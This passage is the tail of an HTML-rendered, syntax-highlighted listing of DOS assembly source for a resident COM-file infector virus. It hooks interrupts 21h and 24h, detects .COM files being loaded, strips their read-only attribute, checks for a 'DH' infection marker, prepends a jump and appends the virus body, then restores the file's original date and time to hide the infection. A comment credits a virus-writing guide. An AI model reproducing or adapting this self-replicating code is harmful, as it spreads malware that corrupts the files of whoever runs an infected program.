        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">chk_com</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">;check extension of loaded file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">;for COM</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                  </span><span class="sc1">;search extension</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                   </span><span class="sc1">;for 'COM', so</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">   </span><span class="sc1">;check 'CO'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">continue</span><span class="sc0">                </span><span class="sc1">;and</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">  </span><span class="sc1">;check 'M'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">continue</span><span class="sc0">                      
                             
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int24h</span><span class="sc0">                   
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attribute</span><span class="sc0">
                
</span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;name of target file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">             </span><span class="sc1">;open file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">            </span><span class="sc1">;simulate int21 call, see below</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_date</span><span class="sc0">        
        
</span><span class="sc5">check_infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;read first 6 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">carrier_begin</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">carrier_begin</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; check initials</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">carrier_begin</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; 'D' and 'H'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">initials</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">save_date</span><span class="sc0">                </span><span class="sc1">;if equal, already</span><span class="sc0">
                         </span><span class="sc1">;infected</span><span class="sc0">
        
</span><span class="sc5">get_length</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                 </span><span class="sc1">;set file pointer to begin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                 </span><span class="sc1">;set file pointer to end</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                   </span><span class="sc1">;ax = file length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">length_file</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_jmp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_virus</span><span class="sc0">              </span><span class="sc1">;summon write virus to file                     </span><span class="sc0">
                         
</span><span class="sc5">save_date</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">;save date of file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">date</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">time</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">                    </span><span class="sc1">;close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;restore int24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">continue</span><span class="sc0">         
        
        


</span><span class="sc5">new_24h</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;critical error handler</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                       PROCEDURES</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">move_pointer</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
                        </span><span class="sc1">;since virus owns int21, a</span><span class="sc0">
</span><span class="sc5">do_int21h</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">;direct call would be counter</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc1">;productive, so do a pushf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">;and call combination - Dark</span><span class="sc0">
                          </span><span class="sc1">;Angel's virus guide is great</span><span class="sc0">
</span><span class="sc5">write_jmp</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">;at expalining this</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">;set pointer to beginning of file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">jump</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">length_file</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">initials</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">       </span><span class="sc1">;write to file function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">length</span><span class="sc0">      </span><span class="sc1">;virus length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">      </span><span class="sc1">;do it</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_date</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">;retrieve date function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">       </span><span class="sc1">;do it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">date</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;restore date &amp; time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">time</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
                     </span><span class="sc1">;set up critical error handler</span><span class="sc0">
</span><span class="sc5">set_int24h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">         </span><span class="sc1">;request address of current handler</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">        </span><span class="sc1">;simulate int21 call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_24h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">         </span><span class="sc1">;set vector to virus handler</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">        </span><span class="sc1">;do it</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_attribute</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">           </span><span class="sc1">;get attribute</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">                </span><span class="sc1">;set attribute</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_int21h</span><span class="sc0">               
        </span><span class="sc6">ret</span><span class="sc0">

    




</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                               DATA</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">old_21h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">old_17h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">old_24h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">carrier_begin</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">name_seg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">name_off</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">virus_segment</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">length_file</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">initials</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4844h</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0">
</span></div></body>
</html>
